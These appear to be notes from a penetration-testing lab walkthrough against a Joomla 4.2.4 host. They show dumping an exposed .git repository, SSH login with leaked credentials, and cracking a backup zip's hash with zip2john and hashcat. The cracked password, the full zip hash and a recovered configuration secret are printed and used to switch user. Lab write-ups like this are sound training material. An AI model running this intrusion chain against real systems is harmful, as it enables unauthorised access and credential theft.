directory listing: http://192.168.217.144/cms/administrator/components/

Joomla CMS version: 4.2.4

http://192.168.217.144/cms/administrator/manifests/files/joomla.xml
```
<folder>administrator</folder>
<folder>api</folder>
<folder>cache</folder>
<folder>cli</folder>
<folder>components</folder>
<folder>images</folder>
<folder>includes</folder>
<folder>language</folder>
<folder>layouts</folder>
<folder>libraries</folder>
<folder>media</folder>
<folder>modules</folder>
<folder>plugins</folder>
<folder>templates</folder>
<folder>tmp</folder>
<file>htaccess.txt</file>
<file>web.config.txt</file>
<file>LICENSE.txt</file>
<file>README.txt</file>
<file>index.php</file>
```


http://192.168.217.144/.git/
directory listing

dump git repo:
`git-dumper http://192.168.217.144/ ./gitdump`

![[Pasted image 20250209131224.png]]

![[Pasted image 20250209131239.png]]

Use the obtained creds to ssh into machine
ssh stuart@192.168.217.144  

transfer /opt/backup/sitebackup3.zip to Kali

extract password hash of zip file (`zip2john sitebackup3.zip`):
```
$zip2$*0*1*0*d3da047a75793317*edb3*34e*d7408d919e51ac40345a8a26d9770cf7587d4350d97d2e18536437ba2959674f04095325cb5ece9e44f3e0dc8677267181501db5088f4592eab769db53cad6767f4da474d1452231ba445ea848fc393cec5e0033322abce883785215a0dde2de71887a2acf2b690f6603f7e8a3ee9f70e2c10048e8f2706ff413c9ea9c3e8b809fd8e29044a5a0ba07035811023bf0a0a56c6ae60c314292035edb4eb0aeac0f1869fa6b7b115573e01efa597a01605cb43522a0b50a68973780a1ad4bfd964ba31088737b0823d4ba33f0f16ad799b8579fd1b1b7326d10816aa9fe030c8e97f4fc3fd2cc30d5cfbff15638cd254d3b28dba99d89d46e0178246fae980decc41137ab1767d75b45f09a3fdd02edb175283a34a8d4439f0abbdcf411efb41ad797d9515beaafb8549d5ab0fb81172967d507b82f5db8d271222696fd703871f74cf7744194e4ffa744e4436471dece563cb2f2e5a16b1a2ae66e004d890ea0b060e551c5372f53ca6c6fd94f0af009e475137bf1a17730ffa8939bf2f7fb30c9bbdaecb00d188f3080426155e08f56e11d42c3db9b4877df51f30c0f8c4b67c245f8bf880093ada71c0a00034f98b09424e2f9181d48dabde0916081a3e9b4640eea7381365321925f9ac5ac793c0eafa5dfeff42bf0c648b8aef353ef7b24ea507282cf1190640817571e56f425ae52ca51a19eba89c1e45219bd7e71b3ea319d99886ad1682850fa3433db526de39c1bb217745fc1d38b261f6743341e8b0dbc12acf42fbf48411d31ece1555b9e6bb65ec5ff06ef75b781f537a62b19e5a607bc58809f15437c138bf17d3906a5b6fbdfc34d0f42ecba74199d3194893af9fa559b3266356ea21f50559c7e59adc8126d82954d5b748a95267e666516787e0218bdcca1b28699b4574f3e50748bac9ba19afc9c7f20c5b17bde8226441cd12107f6e0b62c8a250b80689ce500c599a482abcca70d07d8a16a0c7fcb18f9ee8bc53751cb231c1ba9353cb761c73ec876f2b685ca1a754de1e99f9064775d1232e11f7fd3a7450c44777b4bb3b3adc3adc57e90d9310a6f455001ea26c4b96f8a5dc7e5ac8d463b931b86ed1f24852c6c1fa2b0432c501c05841a393156c0672e414c12644c408d6fb0ff822de964712ee8c7636360f77e0f5eda4060848ed55f5047241b79528ce286fd4fce1a*937f3ebe53da3f7d775a*$/zip2$
```

crack hash
`hashcat -m 13600 sitebackup3.hash /usr/share/wordlists/rockyou.txt --force`

result: codeblue

extract zip file
`7z x sitebackup3.zip -pcodeblue`

find sensitive creds in `configuration.php` of the extracted file:
chloe@challenge.lab
secret: Ee24zIK4cDhJHL4H

in the ssh of stuart, su to chloe
`su chloe`, provide password 

